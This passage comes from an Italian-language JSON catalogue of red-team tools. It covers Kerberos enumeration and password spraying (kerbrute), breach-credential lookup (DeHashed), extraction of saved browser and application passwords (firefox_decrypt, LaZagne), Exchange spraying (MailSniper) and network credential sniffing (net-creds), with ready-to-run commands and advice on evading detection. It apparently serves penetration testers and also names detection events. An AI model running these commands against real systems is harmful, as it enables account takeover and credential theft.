<code>msDS-KeyCredentialLink</code> è raramente monitorato. Il certificato generato rimane valido finché non viene esplicitamente rimosso.</p><p>Durante il <strong>Lateral Movement</strong>, la catena PyWhisker → PKINITtools → UnPAC-the-Hash permette di ottenere l'hash NTLM di account computer dei Domain Controller, abilitando attacchi DCSync senza accesso diretto al DC.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La modifica dell'attributo <code>msDS-KeyCredentialLink</code> genera eventi Directory Service Change (Event ID 5136) nel Security Log del Domain Controller. Microsoft Defender for Identity ha regole specifiche per rilevare l'aggiunta sospetta di Shadow Credentials. Inoltre, l'autenticazione PKINIT successiva genera eventi 4768 con PreAuthType 16, anomalo per account che normalmente usano password.</p><p><strong>Impatto operativo:</strong> L'operazione non causa disservizi e non modifica la password dell'account target. L'utente legittimo continua a funzionare normalmente. Tuttavia, l'aggiunta di chiavi multiple può generare confusione in ambienti che usano legittimamente Windows Hello for Business.</p><p><strong>Mitigazioni:</strong> Eseguire sempre il cleanup dopo l'operazione rimuovendo la chiave iniettata con <code>--action remove</code>. Evitare di iniettare credenziali su account con audit specifici. Monitorare che l'autenticazione PKINIT successiva avvenga da un host plausibile. Per i difensori: implementare regole SIEM sugli eventi 5136 per l'attributo msDS-KeyCredentialLink.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "kerberos-windows-scripts",
    "name": "kerberos_windows_scripts",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerberos_windows_scripts",
    "desc": "Collezione di script Bash per interagire con Kerberos (kinit, klist, rpc) da Linux senza dipendenze pesanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo repository (spesso associato a ropnop o risorse simili) fornisce un set di script Bash leggeri per gestire l'autenticazione Kerberos direttamente da un terminale Linux (es. Kali o una macchina compromessa). Permette di richiedere ticket (TGT/TGS), listare la cache e interagire con servizi RPC senza dover installare suite pesanti come Impacket, sfruttando i binari nativi <code>krb5-user</code>.</p><br><hr><h4 class=\"rt-purple\">Script principali</h4><p><strong>kinit wrappers:</strong> Script per automatizzare la richiesta di TGT con password o keytab, gestendo automaticamente la configurazione del realm in <code>krb5.conf</code> se necessario.</p><p><strong>Ticket Management:</strong> Utility per visualizzare (<code>klist</code> wrapper), rinnovare o distruggere ticket nella cache, essenziale per passare da un'identità compromessa all'altra.</p><p><strong>RPC Interaction:</strong> Helper per usare <code>rpcclient</code> con autenticazione Kerberos (flag <code>-k</code>) sfruttando il ticket in cache per enumerazione SMB/RPC stealth.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire gli script dalla shell dopo aver installato i client krb5.</p><pre><code># Autenticazione e ottenimento TGT\n./init_krb.sh user@DOMAIN.LOCAL Password123\n\n# Enumerazione RPC usando il ticket\nrpcclient -k dc01.domain.local -c \"enumdomusers\"</code></pre><p>La variabile d'ambiente <code>KRB5CCNAME</code> viene spesso gestita per puntare al ticket corretto.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Perfetto per scenari <strong>Living off the Land</strong> su server Linux compromessi che sono già joinati al dominio (es. server web SSSD). Permette di usare l'identità della macchina o di un utente compromesso per muoversi lateralmente senza caricare tool esterni sospetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede che il pacchetto <code>krb5-user</code> sia installato. Il traffico Kerberos verso il DC è legittimo, ma l'uso anomalo (es. troppi TGT request) può essere loggato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "kerbrute",
    "name": "kerbrute",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool per enumerazione utenti e password spraying via Kerberos Pre-Auth, stealth rispetto ai log di login classici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Kerbrute</strong> è un tool scritto in Go progettato per enumerare account utente validi e testare password in ambienti Active Directory utilizzando il protocollo Kerberos. Interagisce direttamente con il KDC (Key Distribution Center) sulla porta 88, analizzando le risposte alle richieste AS-REQ di pre-autenticazione. Il KDC restituisce errori differenti per utenti inesistenti (<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>) e per utenti validi con password errata (<code>KDC_ERR_PREAUTH_FAILED</code>), permettendo di distinguere i due casi. Il vantaggio principale rispetto agli attacchi via NTLM/LDAP è che l'enumerazione utenti non incrementa il contatore di tentativi falliti, rendendo l'operazione invisibile alle policy di lockout. Essendo un binario Go statico, funziona su qualsiasi piattaforma senza dipendenze.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration Stealth:</strong> La modalità <code>userenum</code> invia richieste AS-REQ senza dati di pre-autenticazione per ogni username. Il KDC rivela l'esistenza dell'utente tramite il codice di errore nella risposta senza incrementare il contatore di lockout. Questo permette di testare migliaia di username in pochi secondi senza rischio per gli account legittimi.</p><p><strong>Password Spraying via Kerberos:</strong> La modalità <code>passwordspray</code> testa una singola password contro tutti gli utenti della lista. Genera eventi 4771 (Kerberos Pre-Auth Failed) al posto dei più monitorati 4625 (Logon Failure), offrendo un profilo di rilevamento inferiore in ambienti dove il logging Kerberos non è configurato in modo granulare.</p><p><strong>Brute Force Mirato:</strong> La modalità <code>bruteuser</code> permette di testare una lista di password contro un singolo account target, utile per account di servizio con SPN noti. Il tool gestisce automaticamente la risoluzione DNS del Domain Controller e supporta l'output su file per analisi successive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Kerbrute è un binario standalone che non richiede una macchina unita al dominio. Necessita solo di connettività verso il DC sulla porta 88. Disponibile precompilato per Linux, Windows e macOS.</p><pre><code># Enumerazione utenti validi\n./kerbrute userenum -d corp.local --dc 10.0.0.1 usernames.txt\n\n# Password spraying con password comune\n./kerbrute passwordspray -d corp.local --dc 10.0.0.1 valid_users.txt \"Estate2024!\"\n\n# Brute force su singolo account di servizio\n./kerbrute bruteuser -d corp.local --dc 10.0.0.1 passwords.txt svc_sql\n\n# Enumerazione con output verbose e log\n./kerbrute userenum -d corp.local --dc 10.0.0.1 -v -o results.log usernames.txt</code></pre><p>Generare la lista di username con convenzioni aziendali (nome.cognome, n.cognome) combinando nomi da LinkedIn/OSINT con tool come <code>username-anarchy</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Internal Penetration Test</strong>, Kerbrute è il primo tool utilizzato per costruire una lista di utenti validi e tentare password spraying per ottenere l'accesso iniziale. La combinazione enumerazione + spraying in un unico tool semplifica il workflow operativo.</p><p>Durante il <strong>Red Teaming</strong>, il traffico Kerberos si mescola con l'attività normale del dominio, e l'enumerazione non incrementa i contatori di lockout, permettendo di operare sotto il radar del SOC.</p><p>Per il <strong>Security Audit</strong>, i Blue Team possono usare Kerbrute per testare la robustezza delle password del dominio, verificando se password stagionali comuni sono in uso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera eventi 4771 (Kerberos Pre-Auth Failed) sul DC per ogni tentativo di password fallito. Microsoft Defender for Identity rileva volumi anomali di queste richieste e segnala attività di enumerazione o spraying. Anche SIEM con regole specifiche possono correlare il pattern.</p><p><strong>Impatto operativo:</strong> L'enumerazione utenti non causa lockout, ma il password spraying sì. Rispettare la finestra di reset del contatore (tipicamente 30 minuti) tra un tentativo e l'altro.</p><p><strong>Mitigazioni:</strong> Limitare la velocità delle richieste. Distribuire lo spraying su più ore. Eseguire il tool da host diversi per evitare che un singolo IP generi traffico Kerberos anomalo verso il DC.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "dehashed",
    "name": "Dehashed",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Motore di ricerca e intelligence per credenziali compromesse e asset nel deep web, interrogabile via web o API.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DeHashed</strong> è una piattaforma di data mining e intelligence che indicizza miliardi di asset compromessi provenienti da breach pubblici e privati. A differenza di semplici checker, permette ricerche avanzate (wildcard, regex) su email, username, password, hash, indirizzi IP e nomi fisici. È uno strumento fondamentale per la fase di ricognizione passiva (OSINT) e per arricchire i dati durante un engagement, permettendo di trasformare un singolo indicatore (es. un'email) in un profilo completo di credenziali potenzialmente valide.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Advanced Search Query:</strong> Supporta operatori complessi per filtrare i risultati. È possibile cercare tutte le password associate a un dominio specifico (<code>domain:target.com</code>) o trovare utenti che hanno utilizzato una password specifica (<code>password:\"Company2023!\"</code>), utile per identificare pattern di riutilizzo.</p><p><strong>Breach Monitoring:</strong> Permette di monitorare asset aziendali in tempo reale, ricevendo alert quando nuove credenziali relative al proprio dominio appaiono in dump o leak nel dark web.</p><p><strong>Hash Cracking (Lookup):</strong> Il database contiene spesso sia l'hash che la password in chiaro decifrata da leak precedenti, risparmiando tempo di cracking costoso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Accessibile via interfaccia web o API (per integrazione con tool come <code>DeHashed-API-Wrapper</code> o <code>Maltego</code>).</p><pre><code># Esempio query web per trovare credenziali admin\nemail:admin@target.com AND password:*\n\n# Ricerca inversa da un hash NTLM trovato\nhash:8846F7EAEE8FB117AD06BDD830B7586C\n\n# Ricerca ampia su dominio escludendo sottodomini noise\ndomain:target.com AND NOT email:support@*</code></pre><p>I risultati possono essere esportati in JSON/CSV per analisi offline.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>OSINT & Recon</strong>, fornisce la \"benzina\" per attacchi di Credential Stuffing o Password Spraying senza inviare un singolo pacchetto verso il bersaglio.</p><p>In <strong>Incident Response</strong>, aiuta a verificare se le credenziali di un utente compromesso erano già presenti in breach storici (es. Collection #1) o se sono frutto di un attacco recente (es. InfoStealer malware).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'attività è totalmente <strong>passiva</strong>. Nessuna interazione avviene con i sistemi del target, rendendo questa fase invisibile ai difensori aziendali.</p><p><strong>Impatto operativo:</strong> Nessuno sui sistemi target. Tuttavia, maneggiare database di credenziali reali richiede rispetto delle normative privacy e policy di engagement etico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "dehashed-py",
    "name": "dehashed.py",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Python wrapper per interrogare le API di DeHashed.com da riga di comando, per credential harvesting automatizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dehashed.py</strong> è uno script Python che funge da interfaccia a riga di comando per il servizio DeHashed, uno dei più grandi motori di ricerca di credenziali compromesse provenienti da data breach pubblici. DeHashed aggrega miliardi di record da centinaia di breach (LinkedIn, Adobe, Collection #1-5, Cit0day, ecc.) e permette di cercare per email, username, IP, nome, indirizzo, telefono, hash o password. Questo wrapper CLI permette di automatizzare le query senza usare l'interfaccia web, scaricando i risultati in formato strutturato (JSON/CSV) per integrarli direttamente in pipeline di ricognizione OSINT o attacco. È uno strumento fondamentale nella fase di credential hunting, dove si cercano password riutilizzate o hash crackabili associati al target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bulk Domain Query:</strong> Accetta liste di domini o indirizzi email e interroga le API DeHashed sequenzialmente, gestendo automaticamente la paginazione dei risultati e il rate-limiting. Questo permette di scansionare l'intero parco email di un'organizzazione in pochi minuti, identificando quali dipendenti hanno credenziali esposte in breach passati.</p><p><strong>Output Parsing & Filtering:</strong> Filtra automaticamente i risultati duplicati o incompleti e formatta l'output in modo da essere utilizzabile direttamente con altri tool. Può estrarre solo le password in chiaro (per spraying), solo gli hash (per cracking con Hashcat/John), o l'elenco completo di email:password per validazione manuale. I risultati possono essere esportati in JSON, CSV o testo piano.</p><p><strong>Ricerca Inversa:</strong> Supporta query inverse partendo da un hash o una password nota per trovare tutti gli account associati. Questo è utile per verificare se una password compromessa è utilizzata da altri dipendenti della stessa organizzazione (password reuse cross-account).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede un account DeHashed attivo con API key valida (servizio a pagamento). L'API key viene configurata come variabile d'ambiente o nel file di configurazione dello script. Il servizio ha limiti di rate che il tool gestisce automaticamente con pause tra le richieste.</p><pre><code># Ricerca credenziali per dominio aziendale\npython3 dehashed.py -d target.com -o results.json\n\n# Ricerca per email specifica\npython3 dehashed.py -q \"email:admin@target.com\"\n\n# Ricerca inversa partendo da un hash MD5\npython3 dehashed.py -q \"hashed_password:5f4dcc3b5aa765d61d8327deb882cf99\"\n\n# Bulk search da lista di domini\npython3 dehashed.py -f domains.txt -o bulk_results.csv --format csv</code></pre><p>I risultati contengono tipicamente: email, username, password (se in chiaro), hash, nome, IP di registrazione e fonte del breach. Non tutti i campi sono sempre popolati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>OSINT e Credential Harvesting</strong>, dehashed.py è il primo passo per costruire un dizionario di password personalizzato per il target. Le password trovate in breach precedenti, anche se cambiate, rivelano pattern di scelta dell'utente (es. \"NomeCognome2020!\" → probabile \"NomeCognome2024!\") che possono essere sfruttati con regole di mutazione in Hashcat.</p><p>Per il <strong>Password Spraying</strong>, le credenziali trovate in chiaro possono essere testate direttamente contro i servizi del target (VPN, OWA, O365) per verificare il riutilizzo delle password tra account personali e aziendali.</p><p>Nel contesto di <strong>Threat Intelligence e Monitoring</strong>, lo script può essere schedulato per eseguire query periodiche sui domini dei clienti, fornendo un servizio di early warning quando nuove credenziali appaiono in breach recenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'attività è completamente passiva rispetto al target: il traffico va verso i server DeHashed, non verso l'infrastruttura della vittima. Non esiste modo per il target di sapere che le sue credenziali sono state ricercate. Tuttavia, l'account DeHashed utilizzato è tracciabile.</p><p><strong>Impatto operativo:</strong> Nessun impatto sull'infrastruttura target. Il rischio principale è nella gestione dei dati: i file di output contengono PII (dati personali) e password reali che devono essere protetti secondo le normative vigenti (GDPR).</p><p><strong>Mitigazioni:</strong> Criptare i file di output e cancellarli dopo l'uso. Non conservare database di credenziali oltre il necessario per l'assessment. Utilizzare account DeHashed dedicati per engagement specifici. Documentare l'uso nel report per trasparenza verso il cliente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "firefox-decrypt-main",
    "name": "firefox_decrypt-main",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/unode/firefox_decrypt",
    "desc": "Script Python per estrarre e decifrare password salvate nei profili Mozilla (Firefox, Thunderbird) anche con Master Password.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Firefox Decrypt</strong> è uno script Python specializzato nell'estrazione e decifratura delle credenziali salvate nei profili dei prodotti Mozilla (Firefox, Thunderbird, SeaMonkey e derivati). I browser Mozilla memorizzano le password in due file chiave: <code>logins.json</code> (contiene URL, username e password cifrate in base64) e <code>key4.db</code> (database SQLite con le chiavi di crittografia). Lo script legge entrambi i file, deriva la chiave di decifratura usando le librerie NSS (Network Security Services) e presenta le credenziali in chiaro. Supporta anche profili protetti da Master Password: in quel caso chiede la password principale per sbloccare il keystore. È uno strumento essenziale nella fase post-exploitation per il credential harvesting da workstation compromesse.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decifratura Multi-Prodotto:</strong> Funziona con tutti i prodotti basati su Mozilla: Firefox (tutte le versioni), Thunderbird (recupera anche credenziali IMAP/SMTP/POP3), SeaMonkey e browser derivati come Pale Moon o Waterfox. Il formato del database delle credenziali è standardizzato, quindi lo script è compatibile con profili provenienti da Windows, Linux e macOS senza modifiche.</p><p><strong>Master Password Support:</strong> Se l'utente ha configurato una Master Password, il tool la richiede interattivamente per derivare la chiave di decifratura. Questo permette il recovery anche di profili protetti, a condizione di conoscere la password principale. In caso di Master Password sconosciuta, il tool segnalerà l'impossibilità di procedere senza tentare brute-force.</p><p><strong>Output Flessibile:</strong> Le credenziali estratte possono essere visualizzate a terminale o esportate in formato CSV/JSON per integrazione con altri tool. L'output include URL del sito, username, password in chiaro e data di creazione/ultimo utilizzo della credenziale, informazioni utili per prioritizzare quali accessi sfruttare.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script può essere eseguito direttamente sulla macchina target o su un profilo copiato offline. Se eseguito senza argomenti, cerca automaticamente i profili Mozilla nei percorsi standard del sistema operativo. È possibile specificare un percorso personalizzato per profili esportati o copiati.</p><pre><code># Scansione automatica dei profili Firefox locali\npython3 firefox_decrypt.py\n\n# Decifratura di un profilo copiato da un'altra macchina\npython3 firefox_decrypt.py /tmp/profilo_vittima/abc123.default/\n\n# Export in formato CSV per analisi\npython3 firefox_decrypt.py --format csv > credenziali.csv\n\n# Decifratura con Master Password nota\npython3 firefox_decrypt.py --pass-prefix \"MasterPass123\"</code></pre><p>Per ottenere il profilo da una macchina remota, copiare l'intera cartella del profilo (tipicamente in <code>~/.mozilla/firefox/xxxx.default/</code> su Linux o <code>%APPDATA%\\Mozilla\\Firefox\\Profiles\\</code> su Windows). I file essenziali sono <code>logins.json</code>, <code>key4.db</code> e <code>cert9.db</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Post-Exploitation Workstation</strong>, dopo aver ottenuto accesso a un PC aziendale, l'estrazione delle credenziali salvate nel browser è una delle prime azioni. Le password di portali web interni, VPN SSL, webmail, pannelli di amministrazione e servizi cloud spesso rivelano credenziali riutilizzate o pattern che facilitano il movimento laterale.</p><p>Per la <strong>Digital Forensics</strong>, lo script è utilizzato durante le indagini per recuperare le credenziali memorizzate da un sospetto, analizzando profili estratti da immagini disco o acquisizioni live, senza necessità di avviare il browser.</p><p>Durante il <strong>Credential Pivoting</strong>, le password Thunderbird (IMAP/SMTP) sono particolarmente preziose: spesso sono credenziali di dominio Active Directory che permettono l'accesso a risorse di rete ben oltre la semplice posta elettronica.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'operazione è una semplice lettura di file locali e non genera traffico di rete né eventi di sicurezza specifici. Tuttavia, l'accesso ai file del profilo mentre Firefox è in esecuzione può fallire a causa del lock sul database SQLite. Soluzioni EDR avanzate possono rilevare l'accesso programmatico ai file <code>key4.db</code> e <code>logins.json</code> come comportamento sospetto.</p><p><strong>Impatto operativo:</strong> Nessun impatto sul sistema. L'operazione è in sola lettura e non modifica i file del profilo. L'utente non noterà alcuna anomalia nel browser.</p><p><strong>Mitigazioni:</strong> Copiare i file del profilo in una directory temporanea prima dell'estrazione per evitare conflitti di lock. Eseguire l'operazione quando il browser è chiuso. Cancellare il file di output dopo l'uso per non lasciare credenziali in chiaro su disco. Per operazioni offline, preferire l'estrazione del profilo completo piuttosto che l'esecuzione dello script sul target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "lazagne-2-4-7",
    "name": "LaZagne",
    "version": "2.4.7",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/AlessandroZ/LaZagne",
    "desc": "Tool forense/offensivo all-in-one per recuperare password salvate localmente da browser, chat, database, wifi e sysadmin tool.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LaZagne</strong> è un'applicazione post-exploitation open source utilizzata per recuperare le molteplici password che gli utenti salvano quotidianamente sul proprio computer. Supporta Windows, Linux e macOS. Il tool scansiona il file system e il registro alla ricerca di credenziali memorizzate da browser, client di posta, database manager, strumenti di amministrazione (es. Putty, WinSCP) e configurazioni WiFi, decifrandole quando possibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Supporto Multi-Software:</strong> Include decine di moduli specifici per estrarre password da Chrome, Firefox, Outlook, Thunderbird, FileZilla, PuTTY, OpenSSH, VNC, Network Manager e molti altri.</p><p><strong>Decifratura Locale:</strong> Utilizza le API di sistema (come DPAPI su Windows o GNOME Keyring su Linux) o algoritmi noti per decifrare le password offuscate trovate nei file di configurazione.</p><p><strong>Esecuzione in Memoria:</strong> Su Windows, può essere caricato riflessivamente o eseguito come standalone senza dipendenze Python esterne (usando la versione compilata PyInstaller), facilitando l'uso su macchine compromesse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare l'eseguibile da riga di comando. Senza argomenti tenta tutti i moduli.</p><pre><code># Esecuzione completa (Tutti i moduli)\nlazagne.exe all\n\n# Solo browser e output su file\nlazagne.exe browsers -oN -o output.txt\n\n# Specifico per WiFi (richiede Admin)\nlazagne.exe wifi</code></pre><p>Su Linux/Mac: <code>python3 laZagne.py all</code>. I risultati vengono stampati a video e possono essere salvati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong> su una workstation compromessa, LaZagne è spesso il passo più veloce per ottenere credenziali per muoversi lateralmente (es. password di root del database salvata in un client SQL, o chiave SSH privata non protetta da passphrase). Essenziale per dimostrare il rischio del salvataggio password nei browser.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La maggior parte degli antivirus ed EDR rileva LaZagne basandosi sulla firma dell'eseguibile o sul comportamento (accesso massivo a file di configurazione browser/mail). L'uso della DPAPI genera eventi di sistema.</p><p><strong>Mitigazioni:</strong> Non usare l'EXE standard. Eseguire tramite Python se presente sul target, o ricompilare/offuscare il codice. Eseguire solo moduli specifici necessari per ridurre il rumore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "mailsniper",
    "name": "MailSniper",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dafthack/MailSniper",
    "desc": "Toolkit PowerShell per cercare dati sensibili nelle caselle di posta Exchange/O365, eseguire password spraying e testare injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MailSniper</strong> è uno strumento offensivo dedicato agli ambienti Microsoft Exchange e Office 365. È progettato per due scopi principali: la ricerca di dati sensibili (termini come \"password\", \"credenziali\", \"fattura\") all'interno delle email di un'organizzazione e l'esecuzione di attacchi di password spraying contro OWA (Outlook Web Access) e EWS (Exchange Web Services). È potente per trasformare un singolo account email compromesso in una compromissione di dati massiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Global Address List (GAL) Dumping:</strong> Scarica l'elenco completo degli indirizzi email dell'azienda per creare liste target precise per attacchi successivi.</p><p><strong>Keyword Search (Self & Delegate):</strong> Cerca termini specifici nella casella di posta dell'utente corrente e in tutte le caselle su cui l'utente ha permessi di delega. Utile per trovare VPN config, password inviate via mail o dati finanziari.</p><p><strong>Password Spraying OWA/EWS:</strong> Esegue attacchi di brute-force distribuito (spraying) contro i portali web di posta, supportando la rotazione degli host e il controllo dei tempi per evitare il blocco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Importare il modulo PowerShell.</p><pre><code># Ricerca termini sensibili nella mailbox corrente\nInvoke-SelfSearch -MailboxUser user@domain.com\n\n# Password Spraying contro OWA\nInvoke-PasswordSprayOWA -Url https://mail.corp.com/owa -UserList users.txt -Password \"Estate2024!\"\n\n# Ricerca su tutte le mailbox (Richiede Admin Exchange)\nInvoke-GlobalMailSearch -ImpersonationUser Admin -ExchHostname mail.corp.com -Terms \"password\",\"secret\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In uno scenario di <strong>Internal Threat</strong> o <strong>Compromised User</strong>, MailSniper automatizza la ricerca di informazioni sfruttabili tra migliaia di email storiche. Il password spraying su OWA è spesso l'unico vettore disponibile dall'esterno se la VPN richiede certificati o MFA (anche se OWA dovrebbe avere MFA).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo spraying su OWA genera molti log di accesso fallito (IIS logs, Event logs). La ricerca massiva via EWS genera traffico anomalo e carico sul server Exchange.</p><p><strong>Mitigazioni:</strong> Usare l'opzione <code>-Sleep</code> per rallentare le richieste. Per la ricerca, limitarsi a mailbox chiave o termini specifici per ridurre il tempo di connessione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "net-creds",
    "name": "net-creds",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/DanMcInerney/net-creds",
    "desc": "Script Python per sniffing passivo di credenziali e hash (HTTP, FTP, NTLM, Kerberos, ecc.) da interfaccia di rete o pcap.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Net-Creds</strong> è uno sniffer di rete scritto in Python focalizzato esclusivamente sull'estrazione automatica di credenziali e dati sensibili dal traffico di rete. A differenza di sniffer generici come Wireshark o tcpdump che catturano tutto il traffico, Net-Creds analizza i pacchetti in tempo reale e mostra solo le informazioni rilevanti: username, password, hash di autenticazione, URL visitati e query DNS. Supporta l'analisi di oltre una dozzina di protocolli di autenticazione, tra cui HTTP Basic/Digest, FTP, SMTP, POP3, IMAP, Telnet, SNMP community strings, NTLMv1/v2, Kerberos e IRC. Può operare sia in modalità live (sniffing di interfaccia) che offline (analisi di file pcap). Lo script è leggero e non richiede installazione complessa, rendendolo ideale per il deployment rapido su macchine compromesse.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Protocol Credential Parsing:</strong> Net-Creds riconosce automaticamente i protocolli di autenticazione nei pacchetti catturati e ne estrae le credenziali. Per protocolli in chiaro (FTP, HTTP Basic, Telnet, POP3), mostra direttamente username e password. Per protocolli challenge-response (NTLM, Kerberos), estrae gli hash nel formato corretto per essere crackati con Hashcat o John the Ripper. Ogni credenziale è mostrata con IP sorgente, destinazione e protocollo, facilitando l'identificazione della vittima.</p><p><strong>URL e Query Logging:</strong> Oltre alle credenziali, il tool logga tutti gli URL HTTP visitati e le query di ricerca effettuate, fornendo una panoramica delle attività web degli utenti sulla rete. Questo è utile per identificare portali interni, servizi cloud utilizzati e pattern di navigazione che possono rivelare informazioni sensibili.</p><p><strong>Analisi Pcap Offline:</strong> Può elaborare file di cattura pcap registrati da altri tool (tcpdump, Wireshark, Responder), estraendo retroattivamente le credenziali. Questo è utile per l'analisi forense o quando si preferisce catturare il traffico con un tool dedicato e analizzarlo successivamente su una macchina diversa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Net-Creds richiede privilegi root per mettere l'interfaccia di rete in modalità promiscua e accedere ai raw socket. Dipende da Scapy per il parsing dei pacchetti. Su Kali Linux è preinstallato.</p><pre><code># Sniffing live su interfaccia di rete\nsudo python2 net-creds.py -i eth0\n\n# Analisi di un file pcap catturato precedentemente\npython2 net-creds.py -p capture.pcap\n\n# Sniffing filtrando solo traffico verso una subnet\nsudo python2 net-creds.py -i eth0 -f 192.168.1.0/24</code></pre><p>L'output viene mostrato a terminale in tempo reale con colori per distinguere i diversi tipi di credenziali. Per salvare i risultati, redirigere l'output su file con <code>tee</code> o <code>&gt;</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Post-Exploitation</strong>, Net-Creds viene lasciato in esecuzione su un server compromesso (file server, gateway, print server) per raccogliere passivamente le credenziali di tutti gli utenti che si autenticano verso quel server. In reti aziendali con applicazioni legacy, è comune trovare traffico FTP, HTTP Basic Auth e SNMP con community strings in chiaro.</p><p>Durante operazioni di <strong>Man-in-the-Middle</strong>, combinato con tool come ARP spoofing (Bettercap, Ettercap) o LLMNR poisoning (Responder), Net-Creds analizza il traffico dirottato per estrarre automaticamente le credenziali senza dover analizzare manualmente migliaia di pacchetti.</p><p>Per l'<strong>Audit di Sicurezza di Rete</strong>, i team di sicurezza lo utilizzano per verificare se esistono protocolli non cifrati in uso nella rete aziendale, identificando applicazioni che trasmettono credenziali in chiaro e necessitano di migrazione a protocolli sicuri (HTTPS, SFTP, SNMPv3).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'operazione è completamente passiva e non genera traffico di rete. Tuttavia, mettere l'interfaccia in modalità promiscua può essere rilevato da tool di monitoraggio locale o da altri host sulla rete (con tecniche di promiscuous mode detection). Su switch managed, il traffico visibile è limitato alla porta corrente a meno che non si configuri port mirroring o si usi ARP spoofing.</p><p><strong>Impatto operativo:</strong> Nessun impatto sulla rete o sui servizi. Lo script è leggero e non causa rallentamenti apprezzabili nemmeno su interfacce ad alto throughput. Il consumo di memoria è proporzionale al volume di credenziali trovate.</p><p><strong>Mitigazioni:</strong> Eseguire lo script con <code>nohup</code> o <code>screen</code> per mantenerlo attivo dopo la disconnessione. Limitare la cattura a protocolli specifici se si è interessati solo a certi tipi di credenziali. Su reti switched, combinare con ARP spoofing mirato (non broadcast) per 